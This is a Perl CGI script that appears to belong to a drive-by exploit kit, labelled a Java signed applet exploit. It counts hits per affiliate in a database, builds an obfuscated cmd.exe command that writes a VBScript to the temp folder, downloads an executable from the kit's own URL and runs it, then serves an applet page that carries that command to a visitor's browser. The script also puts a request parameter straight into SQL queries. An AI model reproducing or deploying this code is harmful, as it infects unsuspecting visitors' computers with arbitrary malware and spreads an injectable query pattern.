#!/usr/bin/perl

#
#  Java Signed Applet exploit (var randomizer for vbs)
#
#  NOT TESTED ...
#

use CGI;
use DBI;
require "../lib/JsXOR.pm";
require "../config.pl";

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

#Insert the view param on exploit (admin)
$sql = "UPDATE exploits SET javadrive=javadrive+1 WHERE affid='admin'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

$q = new CGI;

$aff = $q->param('aff');

#Insert the view param on exploit
$sql = "UPDATE exploits SET javadrive=javadrive+1 WHERE affid='$aff'";
$statement = $dbh->prepare($sql);
$statement->execute(); #or print "$DBI::errstr";

#URL for downloading file
$urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=javadrive';

#randomize vars for vbs
$DimS       = JsXOR::generate_random_string(int(rand 15));
$DimA       = JsXOR::generate_random_string(int(rand 15));
$DTNDTN     = JsXOR::generate_random_string(int(rand 15));
$DimHttp    = JsXOR::generate_random_string(int(rand 15));
$localexe   = JsXOR::generate_random_string(int(rand 15)) . '.exe';
$vbsnamer   = JsXOR::generate_random_string(int(rand 15));
$shellnamer = JsXOR::generate_random_string(int(rand 15));

$pathvbsnamer = '%temp%\\' . $vbsnamer . '.vbs';

$thevbsstring = "cmd.exe /c echo Const adTypeBinary = 1 > $pathvbsnamer" .
" & echo Const adSaveCreateOverWrite = 2 >> $pathvbsnamer" .
" & echo Dim $DimS >> $pathvbsnamer" .
" & echo Dim $DimA >> $pathvbsnamer" .
" & echo Dim $DTNDTN >> $pathvbsnamer" .
" & echo $DimS = \"ADODB\" >> $pathvbsnamer" .
" & echo $DimA = \".Stream\" >> $pathvbsnamer" .
" & echo Set $DTNDTN = CreateObject($DimS+$DimA) >> $pathvbsnamer" .
" & echo $DTNDTN.Type = adTypeBinary >> $pathvbsnamer" .
" & echo $DTNDTN.Open >> $pathvbsnamer" .
" & echo $DTNDTN.Write BinaryGetURL(Wscript.Arguments(0)) >> $pathvbsnamer" .
" & echo $DTNDTN.SaveToFile Wscript.Arguments(1), adSaveCreateOverWrite >> $pathvbsnamer" .
" & echo Function BinaryGetURL(URL) >> $pathvbsnamer" .
" & echo Dim $DimHttp >> $pathvbsnamer" .
" & echo Set $DimHttp = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> $pathvbsnamer" .
" & echo $DimHttp.Open \"GET\", URL, False >> $pathvbsnamer" .
" & echo $DimHttp.Send >> $pathvbsnamer" .
" & echo BinaryGetURL = $DimHttp.ResponseBody >> $pathvbsnamer" .
" & echo End Function >> $pathvbsnamer" .
" & echo Set $shellnamer = CreateObject(\"WScript.Shell\") >> $pathvbsnamer" .
" & echo $shellnamer.Run \"\%temp\%\\$localexe\" >> $pathvbsnamer" .
" & start $pathvbsnamer" .
"  \"$urlllll\" \%temp\%\\$localexe";


my $allhtml = <<HEOF;

<html>
<body>

<applet width='500' height='500' code='Client.class' archive='../dep/Client.jar'>
<param name='windows1' value='$thevbsstring'>
</applet>
</body>
</html>

HEOF


###### BEGIN PRINT EXPLOIT #########
print $q->header();

print "$allhtml";

####### END PRINT EXPLOIT ##########


$dbh->disconnect();



1;
